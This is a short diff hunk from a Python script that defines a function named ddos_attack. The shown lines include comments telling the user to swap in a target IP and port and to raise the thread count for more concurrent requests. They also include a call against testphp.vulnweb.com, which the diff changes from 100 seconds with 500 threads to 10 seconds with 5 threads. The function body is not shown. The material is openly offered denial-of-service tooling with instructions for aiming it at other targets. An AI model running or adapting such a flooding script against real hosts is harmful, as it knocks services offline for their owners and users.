@@ -67,4 +67,4 @@ def ddos_attack(target_ip, target_port, duration, num_threads):
 # Replace 'testphp.vulnweb.com' with the target IP and 80 with the target port.
 # Set the duration to the number of seconds you want the attack to run.
 # Increase num_threads to increase the number of concurrent requests.
-ddos_attack('testphp.vulnweb.com', 80, 100, 500)
+ddos_attack('testphp.vulnweb.com',80, 10, 5)
